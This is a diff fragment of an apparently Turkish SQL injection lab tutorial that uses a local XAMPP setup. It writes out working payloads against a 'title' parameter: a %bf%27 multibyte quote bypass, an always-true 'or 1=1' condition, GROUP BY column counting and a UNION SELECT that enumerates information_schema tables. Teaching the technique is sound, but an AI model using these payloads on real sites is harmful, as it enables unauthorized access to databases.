@@ -21,7 +21,9 @@ XAMPP yönetim panelinden my.ini konfigürasyon dosyasını açalım ve characte
 Uygulamamızda rast gele birşeyler aratalım ve urlin title kısmını `title=%bf%27` olarak değiştirlerim.
 ![](/images/error.jpeg)
 tek tırnak işaretimiz fazla olduğu için sql hatası aldık.Url in title kısmını `title=%bf%27or1=1--+` değiştirir isek artık hata almadığımızı ve iki koşuldan birisi doğru olduğu için tüm filimleri görmüş oluyoruz.
+
 ![](/images/or1=1.jpeg)
+
 Tablomuzun kolon sayısını öğrenmek için `title=%bf%27GROUP BY (değer)--+` değer kısmını uygulama hata verene kadar bir bir arttıralım ve hata verdikten bir önceki sayıymız koln sayımızdır.
 Koln sayımızı bulduğumuza göre UNION sorgumuzu çalıştırabliriz.Tablo isimlerini bulmak için information_schema tablosunu kullanıyoruz. `title=%bf%27%20UNION%20SELECT%20NULL,table_name,NULL,NULL,NULL,NULL,NULL%20FROM%20information_schema.tables--+`
 ![](/images/tables.jpeg)
